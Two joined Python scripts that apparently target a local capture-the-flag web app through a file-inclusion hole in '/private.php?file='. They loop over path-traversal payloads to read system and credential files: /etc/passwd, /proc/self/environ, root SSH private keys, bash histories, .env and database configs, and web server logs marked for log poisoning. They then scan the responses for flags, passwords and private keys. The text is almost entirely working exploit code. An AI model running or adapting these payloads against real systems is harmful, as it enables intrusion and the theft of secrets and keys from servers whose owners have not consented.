import requests
import re

TARGET = "http://127.0.0.1:33001"

print("="*80)
print("LFI CONFIRMED - EXTRACTING FILES")
print("="*80)

# Files to try
FILES_TO_TEST = [
    ("../../../etc/passwd", "passwd"),
    ("../../../etc/hostname", "hostname"),
    ("../../../etc/issue", "issue"),
    ("../../../etc/os-release", "os-release"),
    ("../../../proc/version", "proc/version"),
    ("../../../proc/self/environ", "proc/self/environ"),
    ("../../../proc/self/cmdline", "proc/self/cmdline"),
    ("../../../var/www/html/index.php", "index.php source"),
    ("../../../var/www/html/private.php", "private.php source"),
    ("../../../var/www/html/login.php", "login.php source"),
    ("../../config.php", "config.php"),
    ("../../../flag.txt", "flag.txt"),
    ("../../../flag", "flag"),
    ("../../../root/flag.txt", "root/flag.txt"),
    ("../../../../../flag", "flag deep"),
    ("flag.txt", "flag.txt local"),
    ("config.php", "config.php local"),
    ("db.php", "db.php local"),
]

endpoint = "/private.php"
base_url = f"{TARGET}{endpoint}"

# Get baseline to subtract
baseline = requests.get(base_url, timeout=10)

print("\n[+] Extracting files via LFI...\n")

flag_found = None
interesting_content = []

for filepath, desc in FILES_TO_TEST:
    url = f"{base_url}?file={filepath}"
    
    try:
        resp = requests.get(url, timeout=15)
        
        # Calculate content difference
        content_diff = len(resp.text) - len(baseline.text)
        
        if content_diff > 100:
            # Extract content between HTML tags that looks like file content
            text_content = re.sub(r'<[^>]+>', '', resp.text)
            text_content = re.sub(r'\s+', '\n', text_content).strip()
            
            print(f"\n{'='*60}")
            print(f"[SUCCESS] {desc} ({filepath})")
            print(f"Status: {resp.status_code} | Content Diff: +{content_diff} bytes")
            print(f"{'='*60}")
            
            # Print clean content
            if len(text_content) > 50:
                print(text_content[:2000])
                if len(text_content) > 2000:
                    print(f"\n... [truncated, total: {len(text_content)} chars] ...")
            
            # Check for flags
            flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
            if flags:
                print(f"\n[!] FLAGS FOUND: {flags}")
                flag_found = flags
            
            interesting_content.append((filepath, desc, text_content[:1000]))
            
    except Exception as e:
        print(f"  [ERROR] {desc}: {e}")

print(f"\n\n{'='*60}")
print("SUMMARY")
print(f"{'='*60}")

if flag_found:
    print(f"\n[!] CRITICAL: FLAG FOUND: {flag_found}")
elif interesting_content:
    print(f"\n[+] Successfully extracted {len(interesting_content)} files:")
    for fpath, fdesc, _ in interesting_content:
        print(f"    - {fpath} ({fdesc})")
else:
    print("\n[-] No significant file content extracted")
import requests
import re

TARGET = "http://127.0.0.1:33001"
endpoint = "/private.php"
base_url = f"{TARGET}{endpoint}"

print("="*80)
print("SEARCHING FOR FLAGS AND SENSITIVE FILES")
print("="*80)

# More files to try
SENSITIVE_FILES = [
    # Config files
    ("../../../var/www/html/config.php", "config.php"),
    ("../../../var/www/html/database.php", "database.php"),
    ("../../../var/www/html/db_config.php", "db_config.php"),
    ("../../../var/www/html/.env", ".env"),
    ("../../../var/www/.env", ".env parent"),
    ("../../../var/www/html/.htaccess", ".htaccess"),
    ("../../../etc/apache2/apache2.conf", "apache2.conf"),
    ("../../../etc/apache2/sites-available/000-default.conf", "apache vhost"),
    
    # SSH keys
    ("../../../root/.ssh/id_rsa", "root SSH key"),
    ("../../../root/.bash_history", "root bash history"),
    ("../../../home/www-data/.bash_history", "www-data history"),
    
    # Logs for poisoning
    ("../../../var/log/apache2/access.log", "apache access log"),
    ("../../../var/log/apache2/error.log", "apache error log"),
    ("../../../var/log/httpd/access_log", "httpd access log"),
    ("../../../var/log/nginx/access.log", "nginx access log"),
    ("../../../proc/self/fd/0", "proc fd0"),
    ("../../../proc/self/fd/1", "proc fd1"),
    ("../../../proc/self/fd/2", "proc fd2"),
    
    # Session files
    ("../../../var/lib/php/sessions/", "PHP sessions dir"),
    
    # Flags
    ("flag", "flag no ext"),
    ("flag.txt", "flag.txt"),
    ("flag.php", "flag.php"),
    ("/flag", "/flag absolute"),
    ("/flag.txt", "/flag.txt absolute"),
    ("../../../flag", "flag deep 3"),
    ("../../../../flag", "flag deep 4"),
    ("../../../../../flag", "flag deep 5"),
    ("../../../../../../flag", "flag deep 6"),
    ("../../../root/flag", "root/flag"),
    ("../../../root/flag.txt", "root/flag.txt"),
    ("../../../home/flag", "home/flag"),
    ("../../../tmp/flag", "tmp/flag"),
    ("../../../tmp/flag.txt", "tmp/flag.txt"),
    ("flag.php", "flag.php local"),
    ("../flag.txt", "../flag.txt"),
    ("./flag.txt", "./flag.txt"),
    
    # Hidden files
    (".git/config", ".git/config"),
    ("../.git/config", "../.git/config"),
    ("../../../var/www/html/.git/config", "git config"),
]

baseline = requests.get(base_url, timeout=10)
found_flags = []
interesting_files = []

print("\n[+] Testing for flags and sensitive files...\n")

for filepath, desc in SENSITIVE_FILES:
    url = f"{base_url}?file={filepath}"
    
    try:
        resp = requests.get(url, timeout=15)
        content_diff = len(resp.text) - len(baseline.text)
        
        # Check for flag pattern
        flags = re.findall(r'FLAG\{[^}]+\}', resp.text)
        
        # Check for interesting content indicators
        has_content = content_diff > 50
        has_php = "<?php" in resp.text or "<?=" in resp.text
        has_config = "password" in resp.text.lower() or "secret" in resp.text.lower() or "key" in resp.text.lower()
        has_log = any(x in resp.text for x in ["GET /", "POST /", "HTTP/1.1"])
        has_ssh = "BEGIN RSA" in resp.text or "BEGIN OPENSSH" in resp.text or "PRIVATE KEY" in resp.text
        
        if flags:
            print(f"\n{'='*60}")
            print(f"[!] FLAG FOUND in {desc}")
            print(f"{'='*60}")
            print(f"Flags: {flags}")
            print(f"File: {filepath}")
            found_flags.extend(flags)
        
        if has_content and (has_php or has_config or has_log or has_ssh or flags):
            print(f"\n{'='*60}")
            print(f"[INTERESTING] {desc} ({filepath})")
            print(f"Status: {resp.status_code} | Content Diff: +{content_diff} bytes")
            print(f"Indicators: PHP={has_php}, CONFIG={has_config}, LOG={has_log}, SSH={has_ssh}")
            print(f"{'='*60}")
            
            # Clean and print content
            text_content = re.sub(r'<[^>]+>', '', resp.text)
            text_content = re.sub(r'\s+', '\n', text_content).strip()
            print(text_content[:1500])
            
            interesting_files.append((filepath, desc, content_diff))
            
    except Exception as e:
        pass

print(f"\n\n{'='*60}")
print("FINAL RESULTS")
print(f"{'='*60}")

if found_flags:
    print(f"\n[!] FLAGS CAPTURED: {found_flags}")
else:
    print("\n[-] No FLAG{} tokens found")

if interesting_files:
    print(f"\n[+] Found {len(interesting_files)} interesting files:")
    for fpath, fdesc, diff in interesting_files:
        print(f"    - {fpath} ({fdesc}) - +{diff} bytes")
else:
    print("\n[-] No additional interesting files found")
